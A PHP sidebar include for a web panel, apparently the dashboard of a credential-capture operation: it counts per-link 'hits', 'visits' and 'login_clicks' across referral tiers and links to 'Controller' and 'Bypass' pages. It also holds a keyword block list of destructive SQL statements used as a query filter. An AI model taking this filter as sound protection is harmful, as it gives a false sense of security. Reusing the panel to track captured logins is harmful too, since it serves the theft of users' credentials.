<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (!isset($userData) || !is_array($userData)) {
    $userData = ultimaAuthenticatedRegular();
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}

$link_id = (int)$userData['link_id'];
$linkId = $link_id;
if (!isset($isTriplehook)) {
    $isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
} else {
    $isTriplehook = ($isTriplehook === true || $isTriplehook === 1 || $isTriplehook === '1' || (is_string($isTriplehook) && in_array(strtolower(trim((string)$isTriplehook)), ['1','true','yes','on'], true)));
}
$currentPage = $currentPage ?? '';

// Sidebar sayaçları — cache YOK, anlık SQL COUNT. Sayfa açılışında
// badge'ler dolu gelir. WebSocket 'sidebar' kanalı sonraki yeni hit/visit
// için 2 sn tick'te güncelleme gönderir (yeni değeri de anlık gösterir).
$totalHits = 0;
$totalVisits = 0;

if (isset($userData['link_id'])) {
    $__sid = (int)$userData['link_id'];
    $__thRaw = $isTriplehook ?? ($userData['triplehook'] ?? 0);
    $__thMode = ($__thRaw === true || $__thRaw === 1 || $__thRaw === '1' || (is_string($__thRaw) && in_array(strtolower(trim((string)$__thRaw)), ['1','true','yes','on'], true)) || !empty($isTriplehook));

    try {
        if ($__thMode) {
            // Triplehook: 2-level scope (referred_by + triplehook_data recursion)
            $scopeSql = "link_id IN (SELECT link_id FROM regular WHERE referred_by = :lid UNION SELECT r2.link_id FROM regular r2 WHERE r2.referred_by IN (SELECT td.link_id FROM triplehook_data td INNER JOIN regular r ON r.link_id = td.link_id WHERE r.referred_by = :lid2))";
            $params = [':lid' => $__sid, ':lid2' => $__sid];
            $hitsCountResult = executeSafeQuery("SELECT COUNT(*) as total FROM hits WHERE $scopeSql", $params);
            $viewsResult = executeSafeQuery("SELECT COUNT(*) as total FROM views WHERE $scopeSql", $params);
            $clicksResult = executeSafeQuery("SELECT COUNT(*) as total FROM login_clicks WHERE $scopeSql", $params);
        } else {
            // Normal: kullanıcının kendi link_id'si, hidden hits kendisi görür
            $hitsCountResult = executeSafeQuery(
                "SELECT COUNT(*) as total FROM hits WHERE link_id = :link_id AND (IFNULL(hidden,0) = 0 OR hidden_link_id = :viewer_lid)",
                [':link_id' => $__sid, ':viewer_lid' => $__sid]
            );
            $viewsResult = executeSafeQuery(
                "SELECT COUNT(*) as total FROM views WHERE link_id = :link_id",
                [':link_id' => $__sid]
            );
            $clicksResult = executeSafeQuery(
                "SELECT COUNT(*) as total FROM login_clicks WHERE link_id = :link_id",
                [':link_id' => $__sid]
            );
        }
        $totalHits = (int)($hitsCountResult[0]['total'] ?? 0);
        $totalVisits = (int)($viewsResult[0]['total'] ?? 0) + (int)($clicksResult[0]['total'] ?? 0);
    } catch (\Throwable $e) {
        // Bir hata olursa 0 kalır, WS gelince yine güncellenir
    }
}
?>
<style>
.dock-nav{position:fixed;left:0;top:50px;height:calc(100vh - 50px);width:82px;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:1000;padding:20px 0;gap:10px}
.dock-item[data-href="/pages/tools"] i::before{content:none!important;display:none!important}
.dock-item[data-href="/pages/tools"] i.dock-tools-ico{display:flex;align-items:center;justify-content:center}
.dock-item[data-href="/pages/tools"] i.dock-tools-ico svg{display:block}
.dock-item{position:relative;width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;background:#0a0a0c;border:none;overflow:visible}
.dock-item.active::after{content:'';position:absolute;right:-4px;top:50%;transform:translateY(-50%);width:3px;height:16px;background:rgba(255,255,255,.4);border-radius:3px}
.dock-item i{font-size:1.22rem;color:rgba(255,255,255,.3)}
.dock-item.active i{color:rgba(255,255,255,.5)}
.dock-ripple{position:absolute;top:50%;left:50%;width:0;height:0;border-radius:50%;background:transparent;border:1.5px solid rgba(255,255,255,.2);transform:translate(-50%,-50%);pointer-events:none;animation:dock-ring .6s ease-out forwards}
@keyframes dock-ring{0%{width:0;height:0;opacity:.6}100%{width:78px;height:78px;opacity:0}}
.dock-progress-track{position:absolute;bottom:-9px;left:50%;transform:translateX(-50%);width:31px;height:2px;border-radius:1px;background:rgba(255,255,255,.04);overflow:hidden;opacity:0;transition:opacity .2s ease}
.dock-progress-track.active{opacity:1}
.dock-progress-bar{width:0;height:100%;border-radius:1px;background:rgba(255,255,255,.25);will-change:width,background-position}
@keyframes dockProgressTravel{0%{width:5%}55%{width:72%}100%{width:92%}}
@keyframes dockProgressShimmer{0%{background-position:0 0}100%{background-position:31px 0}}
.dock-progress-bar.loading{background:linear-gradient(90deg,rgba(255,255,255,.18),rgba(255,255,255,.48),rgba(255,255,255,.18));background-size:31px 100%;animation:dockProgressTravel 9s cubic-bezier(.16,1,.3,1) forwards,dockProgressShimmer .8s linear infinite}
.dock-badge{position:absolute;top:-3px;right:-3px;min-width:19px;height:19px;padding:0 5px;border-radius:9px;background:#0a0a0c;border:1.5px solid rgba(255,255,255,.08);font-size:.62rem;font-weight:600;color:rgba(255,255,255,.4);display:flex;align-items:center;justify-content:center;line-height:1}
.dock-tooltip{position:absolute;left:71px;top:50%;transform:translateY(-50%) scale(.9);background:#0a0a0c;border:1px solid rgba(255,255,255,.06);color:rgba(255,255,255,.5);font-size:.77rem;font-weight:500;padding:6px 12px;border-radius:8px;white-space:nowrap;opacity:0;pointer-events:none;transition:all .25s cubic-bezier(.4,0,.2,1);letter-spacing:.02em}
.dock-item:hover .dock-tooltip{opacity:1;transform:translateY(-50%) scale(1)}
.mobile-dock-btn{display:none;position:fixed;top:16px;left:16px;width:42px;height:42px;border-radius:50%;background:#0a0a0c;border:none;cursor:pointer;z-index:1002;align-items:center;justify-content:center;color:rgba(255,255,255,.3);font-size:1.05rem}
.dock-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);z-index:999}
@media(max-width:768px){
    .mobile-dock-btn{display:flex;top:34px;left:16px;width:42px;height:42px;border-radius:50%;z-index:999}
    .dock-nav{transform:translateX(-100%);width:82px;background:#0a0a0c;border-right:1px solid rgba(255,255,255,.04);top:42px;height:calc(100vh - 42px);transition:transform 0.4s cubic-bezier(0.16,1,0.3,1),top 0.4s cubic-bezier(0.16,1,0.3,1),height 0.4s cubic-bezier(0.16,1,0.3,1)}
    .dock-nav.mobile-open{transform:translateX(0);top:0!important;height:100vh!important;z-index:99999!important}
    .dock-overlay{transition:opacity 0.3s ease}
    .dock-overlay.active{display:block;animation:fadeIn 0.3s ease forwards}
}
@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
@media(max-width:480px){
    .mobile-dock-btn{top:30px;width:38px;height:38px}
    .dock-nav{top:38px;height:calc(100vh - 38px)}
}
@media(max-width:360px){
    .mobile-dock-btn{top:27px;width:36px;height:36px}
    .dock-nav{top:34px;height:calc(100vh - 34px)}
}
</style>
<button class="mobile-dock-btn" id="mobile-menu-btn"><i class="fas fa-bars"></i></button>
<div class="dock-overlay" id="sidebar-overlay"></div>
<nav class="dock-nav" id="sidebar">
    <div class="dock-item <?= $currentPage == 'dashboard' ? 'active' : '' ?>" data-href="/pages/dashboard">
        <i class="fas fa-home"></i>
        <span class="dock-tooltip">Dashboard</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
    </div>
    <div class="dock-item <?= $currentPage == 'controller' ? 'active' : '' ?>" data-href="/pages/controller">
        <i class="fas fa-gamepad"></i>
        <span class="dock-tooltip">Controller</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
    </div>
    <div class="dock-item <?= $currentPage == 'tools' ? 'active' : '' ?>" data-href="/pages/tools">
        <i class="dock-tools-ico"><svg viewBox="0 0 512 512" width="1.15em" height="1.15em" aria-hidden="true"><path fill="currentColor" d="M466.5 83.7l-192-80a48.15 48.15 0 0 0-36.9 0l-192 80C27.7 91.1 16 108.6 16 128c0 198.5 114.5 335.7 221.5 380.3 11.8 4.9 25.1 4.9 36.9 0C360.1 472.6 496 349.3 496 128c0-19.4-11.7-36.9-29.5-44.3z"/></svg></i>
        <span class="dock-tooltip">Bypass</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
    </div>
    <div class="dock-item <?= $currentPage == 'storage' ? 'active' : '' ?>" data-href="/pages/storage">
        <i class="fas fa-user"></i>
        <span class="dock-tooltip">Hits</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
        <div class="dock-badge" id="sidebar-hits-badge"<?= $totalHits > 0 ? '' : ' hidden style="display:none"' ?>><?= $totalHits > 0 ? $totalHits : '' ?></div>
    </div>
    <div class="dock-item <?= $currentPage == 'visits' ? 'active' : '' ?>" data-href="/pages/visits">
        <i class="fas fa-eye"></i>
        <span class="dock-tooltip">Visits</span>
        <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
        <div class="dock-badge" id="sidebar-visits-badge"<?= $totalVisits > 0 ? '' : ' hidden style="display:none"' ?>><?= $totalVisits > 0 ? $totalVisits : '' ?></div>
    </div>
</nav>
<script>
/* Sidebar badge'leri: paylaşımlı istemcinin 'sidebar' kanalına abone olur.
 * Yeni hit/visit anında badge güncellenir; 0 olduğunda saklanır. Ayrıca
 * pages/storage.php ve pages/visits.php de aynı kanalı dinleyip toplam
 * sayaçlarını anlık günceller — böylece sidebar ile sayfa sayaçları
 * her zaman aynı formülle aynı değeri gösterir. */
(function(){
    function setBadge(el, n){
        if(!el)return;
        var v=parseInt(n,10)||0;
        if(v>0){
            el.textContent=v;
            el.hidden=false;
            el.style.display='';
        } else {
            el.textContent='';
            el.hidden=true;
            el.style.display='none';
        }
    }
    function apply(msg){
        if(!msg||typeof msg!=='object')return;
        if(msg.type!=='sidebar_counts')return;
        setBadge(document.getElementById('sidebar-hits-badge'), msg.hits);
        setBadge(document.getElementById('sidebar-visits-badge'), msg.visits);
        // Sayfa içi sayaçların da güncellenmesi için event yayınla
        try{
            window.dispatchEvent(new CustomEvent('ultima:sidebar-counts',{detail:{
                hits:parseInt(msg.hits,10)||0,
                visits:parseInt(msg.visits,10)||0,
                views:parseInt(msg.views,10)||0,
                clicks:parseInt(msg.clicks,10)||0
            }}));
        }catch(e){}
    }
    function subscribe(){
        if(!window.ultimaWS||typeof window.ultimaWS.subscribe!=='function'){
            setTimeout(subscribe,50);return;
        }
        window.ultimaWS.subscribe('sidebar', apply);
    }
    if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',subscribe);
    else subscribe();
})();
</script>
<script>
(function() {
    var sidebar = document.getElementById('sidebar');
    var mobileBtn = document.getElementById('mobile-menu-btn');
    var overlay = document.getElementById('sidebar-overlay');
    var activeItem = null;
    var navigationTimer = null;
    var isNavigating = false;

    function resetProgress(item) {
        if (!item) return;
        var track = item.querySelector('.dock-progress-track');
        var bar = item.querySelector('.dock-progress-bar');
        if (bar) {
            bar.classList.remove('loading');
            bar.style.width = '0';
        }
        if (track) track.classList.remove('active');
        if (activeItem === item) activeItem = null;
    }

    function startProgress(item) {
        if (activeItem && activeItem !== item) resetProgress(activeItem);
        activeItem = item;
        var track = item.querySelector('.dock-progress-track');
        var bar = item.querySelector('.dock-progress-bar');
        if (!track || !bar) return;
        bar.classList.remove('loading');
        bar.style.width = '0';
        void bar.offsetWidth;
        track.classList.add('active');
        bar.classList.add('loading');
    }

    function closeMobileDock() {
        if (window.innerWidth > 768) return;
        sidebar.classList.remove('mobile-open');
        overlay.classList.remove('active');
        if (mobileBtn) mobileBtn.style.display = 'flex';
        var header = document.getElementById('triplehookHeader');
        if (header) header.style.zIndex = '10000';
    }

    document.querySelectorAll('.dock-item').forEach(function(item) {
        item.addEventListener('click', function() {
            var href = this.getAttribute('data-href');
            if (!href || isNavigating) return;
            if (href === location.pathname) { resetProgress(this); return; }

            isNavigating = true;
            startProgress(this);
            closeMobileDock();

            // Soft-nav: fetch ile HTML çek, DOM swap ile geç — tam sayfa
            // yenilemesi yok, session ve WS bağlantısı korunur.
            // Başarısızlıkta location.assign fallback.
            var used = false;
            try {
                used = (typeof window.ultimaSoftGo === 'function') && window.ultimaSoftGo(href);
            } catch (e) { used = false; }
            if (!used) {
                setTimeout(function() { window.location.assign(href); }, 80);
            }
            clearTimeout(navigationTimer);
            navigationTimer = setTimeout(function() {
                resetProgress(item);
                isNavigating = false;
            }, 10000);
        });
    });

    // Soft-nav bittiğinde item'in "loading" halini sıfırla; history back/forward
    // aynı davranışı tetikler, o yüzden popstate'i de dinliyoruz.
    window.addEventListener('popstate', function() {
        document.querySelectorAll('.dock-item').forEach(resetProgress);
        isNavigating = false;
    });

    // Partial swap sonrası: bu script yeniden çalışmadığı için nav kapısını burada
    // sıfırla ve aktif dock-item'i güncel path'e göre işaretle (chrome korunuyor).
    window.addEventListener('ultima:softnav-complete', function() {
        clearTimeout(navigationTimer);
        isNavigating = false;
        var path = location.pathname;
        document.querySelectorAll('.dock-item').forEach(function(it) {
            resetProgress(it);
            var href = it.getAttribute('data-href');
            if (href) it.classList.toggle('active', href === path);
        });
    });

    window.addEventListener('pagehide', function() { clearTimeout(navigationTimer); });
    window.addEventListener('pageshow', function() {
        clearTimeout(navigationTimer);
        document.querySelectorAll('.dock-item').forEach(resetProgress);
        isNavigating = false;
    });

    if (mobileBtn) {
        mobileBtn.addEventListener('click', function() {
            sidebar.classList.toggle('mobile-open');
            overlay.classList.toggle('active');
            var icon = this.querySelector('i');
            mobileBtn.style.display = sidebar.classList.contains('mobile-open') ? 'none' : 'flex';
            var header = document.getElementById('triplehookHeader');
            if(header) header.style.zIndex = sidebar.classList.contains('mobile-open') ? '1' : '10000';
        });
    }
    if (overlay) {
        overlay.addEventListener('click', function() {
            sidebar.classList.remove('mobile-open');
            overlay.classList.remove('active');
            mobileBtn.style.display = 'flex';
            var header = document.getElementById('triplehookHeader');
            if(header) header.style.zIndex = '10000';
        });
    }
})();
</script>
